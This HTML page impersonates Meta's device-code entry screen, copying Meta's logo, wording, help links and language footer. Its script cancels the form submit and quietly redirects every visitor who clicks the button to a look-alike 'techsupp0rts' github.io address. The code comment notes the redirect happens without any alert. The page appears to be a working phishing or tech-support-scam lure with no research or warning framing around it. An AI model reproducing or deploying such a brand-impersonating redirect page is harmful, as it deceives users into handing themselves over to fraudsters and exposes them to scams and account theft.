<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Enter the code shown on your device — Meta</title>
  <style>
    :root{
      --muted:#6b7280;
      --accent:#1877f2;
    }
    *{box-sizing:border-box;margin:0;padding:0}
    body{
      font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,"Noto Sans",sans-serif;
      background:#fff;
      color:#0f172a;
      display:flex;
      align-items:center;
      justify-content:center;
      min-height:100vh;
      padding:16px;
    }
    .container{width:100%;max-width:420px;text-align:center}
    img.logo{height:40px;margin-bottom:28px}
    h1{font-size:20px;margin-bottom:8px;font-weight:600}
    p.lead{color:var(--muted);margin-bottom:20px;font-size:15px}

    form{display:flex;flex-direction:column;gap:14px;align-items:center}
    input[type="text"]{
      width:100%;
      padding:14px 16px;
      font-size:16px;
      border-radius:8px;
      border:1px solid #d1d5db;
    }
    input[type="text"]:focus{
      outline:none;
      border-color:var(--accent);
      box-shadow:0 0 0 3px rgba(24,119,242,0.15);
    }
    button.primary{
      background:var(--accent);
      color:white;
      border:0;
      padding:14px 22px;
      border-radius:9999px;
      font-weight:600;
      cursor:pointer;
      font-size:15px;
      width:100%;
      max-width:320px;
    }
    button.primary:active{transform:translateY(1px)}

    .footer{
      margin-top:32px;
      font-size:13px;
      color:var(--muted);
      border-top:1px solid #e5e7eb;
      padding-top:12px;
      display:flex;
      justify-content:center;
      gap:12px;
      flex-wrap:wrap;
    }
    .footer a{color:var(--accent);text-decoration:none}

    @media (max-width:480px){
      h1{font-size:18px}
      p.lead{font-size:14px}
      input[type="text"], button.primary{font-size:14px;padding:12px}
    }
  </style>
</head>
<body>
  <main class="container" aria-labelledby="title">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Meta-Logo.png/1200px-Meta-Logo.png?20211104123859" alt="Meta logo" class="logo">
    <h1 id="title">Enter the code shown on your device</h1>
    <p class="lead">Only use a code from a source that you trust. <a href="https://meta.com/help" target="_blank" rel="noopener">Need help?</a></p>

    <form id="codeForm" autocomplete="off" novalidate>
      <input id="code" name="code" type="text" placeholder="Enter code" required />
      <button type="submit" class="primary">Connect your device</button>
    </form>

    <div class="footer">
      <span>English (US)</span>
      <span>हिन्दी</span>
      <span>Español</span>
      <span>Português (Brasil)</span>
      <span>Français (France)</span>
      <span>Deutsch</span>
      <span><a href="#">More languages…</a></span>
      <span><a href="https://meta.com/help" target="_blank">Help Center</a></span>
    </div>
  </main>

  <script>
    const form = document.getElementById('codeForm');
    form.addEventListener('submit', (e)=>{
      e.preventDefault();
      // Direct redirect without showing alert
      window.location.href = "https://24x7techsupp0rts-cloud.github.io/eror/";
    });
  </script>
</body>
</html>
